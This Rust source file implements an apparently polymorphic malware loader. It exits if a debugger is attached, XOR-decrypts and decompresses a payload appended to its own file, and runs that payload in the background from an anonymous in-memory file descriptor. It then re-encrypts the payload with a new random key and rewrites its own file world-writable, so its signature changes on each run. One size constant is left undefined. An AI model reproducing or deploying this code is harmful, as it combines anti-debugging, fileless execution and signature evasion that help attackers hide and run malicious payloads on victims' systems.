use flate2::bufread::GzDecoder;
use libc::{
    c_char, c_int, c_uint, MFD_CLOEXEC, PTRACE_TRACEME, SYS_memfd_create,
    exit, syscall, umask, ptrace
};
use nix::unistd::{dup2, fork, setsid, ForkResult};
use std::env::args;
use std::ffi::{CStr, CString};
use std::fs::{File, Permissions, remove_file, set_permissions};
use std::io::{copy, stdin, Read, Result, Write};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::os::unix::fs::PermissionsExt;
use std::process::Command;

fn morph<R: Read>(program: &mut R, process: &str, loader: &[u8], enc: &[u8]) -> Result<()> {
    let memfd_flags = MFD_CLOEXEC;
    let mut buf = [0; 8192];
    
    match unsafe{ fork() } {
	Ok(ForkResult::Parent { child, .. }) => {
		let pid = child.as_raw();
		match pid {
			0 => (),
			1 => (),
			_ => unsafe { exit(0) },
		}
	}
            
	Ok(ForkResult::Child) => {
	      let n = program.read(&mut buf)?;
	      let arguments: Vec<String> = args().collect();
	      let memfd_name = &CString::new(process).unwrap();
	      let mut memfd = memfd_create(memfd_name, memfd_flags)?;
	      memfd.write_all(&buf[..n])?;
	      copy(program, &mut memfd)?;
	      let _ = unsafe { umask(0) };
	      let _ = setsid();
	      let nulfd = File::open("/dev/null")?;
	      let stdin = stdin();
	      let _ = dup2(nulfd.as_raw_fd(), stdin.as_raw_fd());
	      let _ = Command::new(format!("/proc/self/fd/{}", memfd.as_raw_fd())).args(&arguments[1..]).spawn();

	      let mut urandom = File::open("/dev/urandom")?;
	      let mut new_key = [0; 32];
	      urandom.read(&mut new_key)?;
	      let mut new_enc = Vec::new();
	      for i in 0..loader.len() { new_enc.push(loader[i]) }
	      for i in 0..enc.len() { new_enc.push(enc[i] ^ new_key[i % 32]) }
	      for i in 0..32 { new_enc.push(new_key[i]) }
	      remove_file("PROGRAM").unwrap();
	      let mut new_program = File::create("PROGRAM")?;
	      set_permissions("PROGRAM", Permissions::from_mode(0o777)).unwrap();
	      new_program.write_all(&new_enc)?;
	      },
	Err(_) => (),
	}

    Ok(())
    }

fn memfd_create(name: &CStr, flags: c_uint) -> Result<File> {
    let name: *const c_char = name.as_ptr();
    let retval = unsafe { syscall(SYS_memfd_create, name, flags) };
    Ok(unsafe { File::from_raw_fd(retval as c_int) })
}

fn main()-> Result<()> {
    let mut program = File::open("PROGRAM")?;
    let mut data = Vec::new();
    
    program.read_to_end(&mut data)?;
    program.sync_all()?;

    unsafe {
      let mut offset = 0;
      if ptrace(PTRACE_TRACEME, 0, 1, 0) ==  0 { offset = 2 }
      if ptrace(PTRACE_TRACEME, 0, 1, 0) == -1 { offset = offset * 3}
      if offset != 2 * 3 { exit(0) }
    }

    let length = data.len()-SIZE;
    let loader = &data[..length];
    let encrypted = &data[length..(data.len() - 32)];
    let key = &data[(data.len() - 32)..];
    let mut decrypted = Vec::new();
    for i in 0..encrypted.len() { decrypted.push(encrypted[i] ^ key[i % 32]) }
    let mut gz = GzDecoder::new(&*decrypted);
    let mut decompressed = Vec::new();
    gz.read_to_end(&mut decompressed)?;
    let mut slice: &[u8] = &decompressed;

    morph(&mut slice, "PROCESS", loader, &decrypted)
}
